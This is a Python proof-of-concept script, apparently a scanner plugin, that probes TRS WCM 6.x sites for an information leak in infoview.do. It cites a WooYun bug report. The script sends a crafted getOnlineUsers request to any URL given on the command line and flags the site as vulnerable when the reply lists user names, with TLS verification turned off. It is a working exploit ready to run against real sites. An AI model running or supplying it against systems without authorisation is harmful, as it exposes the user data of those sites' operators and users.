#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS wcm 6.x版本infoview信息泄露
referer: http://www.wooyun.org/bugs/wooyun-2012-012957
author: Lucifer
description: 文件infoview.do中导致信息泄露。
'''
import sys
import requests
import warnings
def run(url):
        result = ['TRS wcm 6.x版本infoview信息泄露','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/wcm/infoview.do?serviceid=wcm6_user&MethodName=getOnlineUsers"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"<USERNAME>" in req.text and r"<Users>" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
